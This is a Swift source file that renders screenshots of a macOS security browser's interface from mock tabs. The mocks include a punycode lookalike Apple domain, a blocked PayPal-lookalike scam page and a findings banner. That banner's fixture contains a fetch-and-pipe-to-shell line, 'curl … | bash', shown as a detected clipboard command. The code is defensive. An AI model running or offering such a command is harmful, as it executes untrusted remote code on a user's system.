import SwiftUI
import AppKit
import WebKit

/// `--render <dir>`: rasterises the chrome into PNGs from windows that are never ordered onscreen.
/// No page is loaded, no network, no prompts; the web view area is left blank on purpose.
@MainActor
enum OffscreenRender {
    private static var hostWindows: [NSWindow] = []

    static func hide(_ w: NSWindow) {
        w.alphaValue = 0; w.ignoresMouseEvents = true
        w.setFrameOrigin(NSPoint(x: -30_000, y: -30_000)); w.orderOut(nil)
    }

    static func host<V: View>(_ view: V, size: NSSize, dark: Bool) -> (NSWindow, NSView) {
        let w = NSWindow(contentRect: NSRect(origin: NSPoint(x: -30_000, y: -30_000), size: size), styleMask: [.borderless], backing: .buffered, defer: false)
        w.alphaValue = 0; w.ignoresMouseEvents = true; w.isReleasedWhenClosed = false
        w.appearance = NSAppearance(named: dark ? .darkAqua : .aqua)
        let hv = NSHostingView(rootView: ZStack { BrowserBackdrop(); view }.environment(\.colorScheme, dark ? .dark : .light))
        hv.frame = NSRect(origin: .zero, size: size)
        w.contentView = hv
        hostWindows.append(w)
        return (w, hv)
    }

    static func snapshot(_ view: NSView, to url: URL) {
        view.layoutSubtreeIfNeeded()
        guard let rep = view.bitmapImageRepForCachingDisplay(in: view.bounds) else { return }
        view.cacheDisplay(in: view.bounds, to: rep)
        try? rep.representation(using: .png, properties: [:])?.write(to: url)
    }

    static func render<V: View>(_ v: V, size: NSSize, name: String, dir: URL) async {
        for dark in [false, true] {
            let (w, hv) = host(v, size: size, dark: dark)
            try? await Task.sleep(nanoseconds: 600_000_000)
            snapshot(hv, to: dir.appendingPathComponent("\(name)-\(dark ? "dark" : "light").png"))
            w.contentView = nil; w.close()
        }
    }

    /// Tabs are built with a configuration but never loaded: `url` and friends are set by hand.
    static func renderAll(to dir: URL) async {
        FileHandle.standardError.write("render: start\n".data(using: .utf8)!)
        try? FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        let model = BrowserModel.shared
        model.rulesStatus = "\(ContentRules.ruleCount) tracker and miner rules active"
        model.daemonReachable = false
        let bank = model.newTab(url: nil, select: true)
        bank.urlChanged(URL(string: "https://online.banking.hsbc.co.uk/account/summary")!)
        bank.title = "HSBC Online Banking"
        bank.identity = IdentitySummary(host: "online.banking.hsbc.co.uk", encrypted: true, subject: "online.banking.hsbc.co.uk", issuer: "DigiCert TLS RSA SHA256 2020 CA1", evaluatedOK: true)
        let shop = model.newTab(url: nil, select: false)
        shop.urlChanged(URL(string: "https://www.xn--pple-43d.com/store")!)
        shop.title = "Apple Store"
        let size = NSSize(width: 1180, height: 760)

        await render(BrowserWindowView(model: model), size: size, name: "01-banking", dir: dir)

        model.selectedTabID = shop.id
        await render(BrowserWindowView(model: model), size: size, name: "02-punycode-address", dir: dir)

        let scam = model.newTab(url: nil, select: true)
        let scamURL = URL(string: "https://paypal-secure-login.top/verify")!
        scam.urlChanged(scamURL)
        let dec = NavigationDecision.block([.likelyScam, .lookalikeDomain], score: 92)
        scam.blockedURL = scamURL; scam.blockedDecision = dec
        scam.interstitial = Interstitial.select(for: dec, host: "paypal-secure-login.top")
        model.recordBlocked(scamURL, decision: dec)
        scam.title = "Blocked"
        await render(BrowserWindowView(model: model), size: size, name: "03-interstitial-block", dir: dir)

        let warnURL = URL(string: "http://old-forum.example/thread/12")!
        let warnDec = NavigationDecision.warn([.plainHTTP], score: 35)
        scam.blockedURL = warnURL; scam.blockedDecision = warnDec
        scam.interstitial = Interstitial.select(for: warnDec, host: "old-forum.example")
        await render(BrowserWindowView(model: model), size: size, name: "04-interstitial-warn", dir: dir)

        scam.interstitial = nil; scam.blockedURL = nil
        scam.urlChanged(URL(string: "https://free-movies.example/watch")!); scam.title = "Watch now"
        scam.pageVerdict = PageFindingPolicy.verdict([
            PageFinding(kind: .clipboardCommand, detail: "curl -fsSL https://… | bash", sample: "curl -fsSL https://cdn.example/fix.sh | bash"),
            PageFinding(kind: .hiddenIframe, detail: "ads.example"),
        ])
        model.recordFindings(scam.pageVerdict.findings, url: scam.url)
        await render(BrowserWindowView(model: model), size: size, name: "05-findings-banner", dir: dir)

        scam.permissionPrompt = PermissionPrompt(kind: .camera, origin: "free-movies.example") { _ in }
        await render(BrowserWindowView(model: model), size: size, name: "06-permission", dir: dir)
        scam.permissionPrompt = nil
        model.showFind = true
        await render(BrowserWindowView(model: model), size: size, name: "07-find", dir: dir)
        model.showFind = false

        await render(ShieldPanel(model: model).frame(width: 360), size: NSSize(width: 360, height: 560), name: "08-shield-panel", dir: dir)
        await render(IdentitySheet(tab: bank).frame(width: 360), size: NSSize(width: 360, height: 260), name: "09-identity", dir: dir)
        await render(IdentitySheet(tab: shop).frame(width: 360), size: NSSize(width: 360, height: 260), name: "10-identity-punycode", dir: dir)
        await render(DownloadsPanel(model: model).frame(width: 380), size: NSSize(width: 380, height: 200), name: "11-downloads-empty", dir: dir)
        print("render: wrote PNGs to \(dir.path)")
    }
}
